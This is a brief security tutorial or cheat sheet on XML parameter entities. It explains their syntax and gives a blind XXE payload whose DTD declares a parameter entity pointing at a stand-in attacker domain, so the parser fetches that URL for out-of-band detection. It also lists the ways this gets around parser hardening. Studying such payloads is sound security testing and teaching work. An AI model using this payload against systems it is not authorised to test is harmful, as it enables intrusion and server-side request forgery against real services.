# XML Parameter Entities for Bypassing Defenses

**XML Parameter Entities for Bypassing Defenses**

**Problem:** Standard external entities (`&xxe;`) may be blocked by validation or parser hardening.

**Solution:** Use **XML Parameter Entities** – a special entity types only referenced within the DTD.

---

**Parameter Entity Syntax**

- **Declaration:** Uses `%` before the name
    
    ```xml
    <!ENTITY % myparam "parameter value">
    
    ```
    
- **Reference:** Also uses `%`
    
    ```xml
    %myparam;
    
    ```
    

---

**Blind XXE Detection with Parameter Entities**

**Payload:**

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "<http://attacker-domain.com>">
    %xxe;
]>

```

**How it Works:**

1. Declares parameter entity `xxe` pointing to your domain
2. Immediately references it within the DTD (`%xxe;`)
3. Causes the parser to fetch the URL during DTD processing
4. Monitor your server for the request

---

**Key Advantages:**

- **Bypasses restrictions** that block regular entity references in XML content
- Executes **during DTD parsing**, before application data is processed
- Useful when you can only inject into the DTD, not the XML body
- Still triggers out-of-band interactions for detection

---

**Note:** Parameter entities are **only valid within the DTD**. You cannot reference them in the XML document body (like `&xxe;`), but their declaration still triggers the external request.